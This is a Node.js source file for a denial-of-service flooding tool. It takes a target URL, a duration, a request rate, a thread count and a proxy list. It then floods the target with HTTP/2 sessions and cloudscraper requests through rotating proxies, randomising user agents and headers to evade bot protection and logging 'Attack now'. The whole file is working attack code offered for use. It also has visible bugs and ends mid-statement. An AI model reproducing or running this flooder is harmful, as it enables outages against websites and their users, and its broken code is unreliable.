const cloudscraper = require("cloudscraper");
const http2 = require("http2");
const { HttpsProxyAgent } = require("https-proxy-agent");
const hpack = require("hpack");
const url = require("url")
const http = require("http")
const Chance = require("chance")
const axios = require("axios")
const fs = require("fs")
const path = require("path")
const os = require("os")
const cluster = require("cluster")
const chance = new Chance()
const file = process.argv[1];
const name = path.basename(file)
const args = () => {
        return {
                target: process.argv[2],
                time: process.argv[3],
                rps: process.argv[4],
                thread: process.argv[5],
                proxyfile: process.argv[6],
        };
}
const { target, time, rps, thread, proxyfile } = args();
if(process.argv.length < 7) {
        console.log(`Using: ${name} target time rps thread proxyfile`)
        process.exit()
}
const accept = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
 ];
const language = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
  '*',
  'en-US,en;q=0.5',
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-GB, en-US, en;q=0.9',
  'de-AT, de-DE;q=0.9, en;q=0.5',
  'cs;q=0.5',
  'da, en-gb;q=0.8, en;q=0.7',
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'tr',
  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
 ];
const encoding = [
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'gzip, deflate, lzma, sdch',
  'deflate',
 ];
const control_header = [
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
];
const ref = [
        "https://baidu.com",
        "https://google.com",
        "https://google.com.vn",
        "https://bing.com",
        "https://youtube.com",
];
const randomUa = () => {
    const s1 = ["(iPhone; CPU iPhone OS 15_0_1 like Mac OS X)", "(Linux; Android 10; SM-A013F Build/QP1A.190711.020; wv)", "(Linux; Android 11; M2103K19PY)", "(Linux; arm_64; Android 11; SM-A515F)", "(Linux; Android 11; SAMSUNG SM-A307FN)", "(Linux; Android 10; SM-A025F)", "(Windows NT 10.0; Win64; x64)", "(Windows NT 6.3)"];
    const s2 = ["AppleWebKit/605.1.15", "AppleWebKit/537.36"];
    const s3 = ["Version/15.0 Mobile/15E148 Safari/604.1", "Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36", "Chrome/96.0.4664.104 Mobile Safari/537.36", "Mobile/15E148", "SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"];
    const nm1 = chance.pickone(s1);
    const nm2 = chance.pickone(s2);
    const nm3 = chance.pickone(s3);
    return `Mozilla/5.0 ${nm1} ${nm2} (KHTML, like Gecko) ${nm3}`;
}
const parsedUrl = url.parse(target)
axios({
        url: target,
        method: "GET",
        path: parsedUrl.pathname
})
.catch(error => {
        if(error.code == "ENOTFOUND") {
                console.log("Invalid hostname");
                process.exit()
        }
})
if (parsedUrl.protocol !== "http:" && parsedUrl.protocol !== "https:") {
        console.log("Invalid protocol")
        process.exit()
}
let readFile;
try {
        readFile = fs.readFileSync(proxyfile, 'utf8').trim().split("\n");
} catch {
        console.log("Invalid proxyfile");
        process.exit()
}
const header = {
        ":method": "GET",
        ":authority": parsedUrl.hostname,
        ":scheme": parsedUrl.protocol.replace(":", ""),
        ":path": parsedUrl.pathname,
        "accept": chance.pickone(accept),
        "accept-language": chance.pickone(language),
        "accept-encoding": chance.pickone(encoding),
        "cache-control": control_header,
        "user-agent": randomUa(),
        "origin": target,
        "upgrade-insecure-requests": "1",
        "referer": chance.pickone(ref),
        "protocol": "h2",
        "sec-fetch-site": "document",
        "sec-fetch-user": "?1"
}
const feel = readFile.filter(proxy => proxy.endsWith(':8080') || proxy.endsWith(':80'));
const proxycac = chance.pickone(feel)
const proxiesLon = `http://${proxycac}`
const header2 = {
        url: target,
        path: parsedUrl.pathname,
        method: "GET",
        proxy: proxiesLon,
        headar: {
                "user-agent": randomUa(),
                "accept": chance.pickone(accept),
                "accept-language": chance.pickone(language),
                "accept-encoding": chance.pickone(encoding),
                "referer": chance.pickone(ref),
                "cache-control": control_header,
        }
}
function startflood() {
        const interval = setInterval(() => {
                for (let i = 0;i < rps;i++) {
                        const proxies = chance.pickone(feel)
                        const proxiesUrl = `http://${proxies}`
                        const agent = new HttpsProxyAgent(proxiesUrl)
                        const request1 = http2.connect(target, { agent });
                        const request2 = http2.connect(target, { agent });
                        const request3 = http2.connect(target, { agent });
                        console.log(`launch cloudscraper ${proxiesLon}`)
                        console.log(`launch http2 ${proxiesUrl}`)
                        const session = http2.connect(target, {
                                settings: {
                                        maxConcurrentStreams: 2000,
                                        headerTableSize: 65536,
                                        initialWindowSize: 6291456,
                                        maxHeaderListSize: 262144,
                                        enablePush: false,
                                },
                                protocol: "https:",
                                agent,
                                maxDeflateDynamicTableSize: 4294967295,
                                maxSessionMemory: 64000,
                        });
                        session.settings({
                                maxConcurrentStreams: 2000,
                                initialWindowSize: 6291456,
                                headerTableSize: 65536,
                                maxHeaderListSize: 262144,
                                enablePush: false,
                        })
                        session.on("connect", () => {
                                const hpackEncoder = new hpack();
                                const encoderHeader = hpackEncoder.encode(header);
                                const kameha = session.request(encoderHeader)
                                cloudscraper(header2)
                                kameha.on("end", () => {
                                        kameha.end();
                                        kameha.destroy();
                                        return
                                })
                                kameha.on("error", () => {
                                        kameha.end();
                                        kameha.destroy();
                                })
                        })
                        session.on("end", () => {
                                session.end()
                                session.destroy()
                                return
                        })
                        session.on("error", () => {
                                session.end()
                                session.destroy()
                                return
                        })
                }
        })
}
if ( cluster.isMaster ) {
        console.clear()
        console.log("Attack now");
        const handleReset = () => {
                const total = os.totalmem();
                const used = process.memoryUsage().rss;
                const percentage = (used / total) * 100;
                if (percentage >= 85) {
                        console.log("[!] Ram is full, proceed to kill worker");
                        const workers = Object.value(cluster.workers);
                        const randomWorker = chance.pickone(workers);
                        randomWorker.kill();
                        cluster.on("exit", (worker, code, signal) => {
                                cluster.fork()
                        })
                }
        }
        setInterval(() => {
                handleReset()
        }, 2000);
        for (let i =0;i < thread;i++) {
                cluster.fork()
        }
} else {
        setInterval(() => {
                startflood()
        })
}
setTimeout(() => {
        console.log("Attack is over")
        process.exit()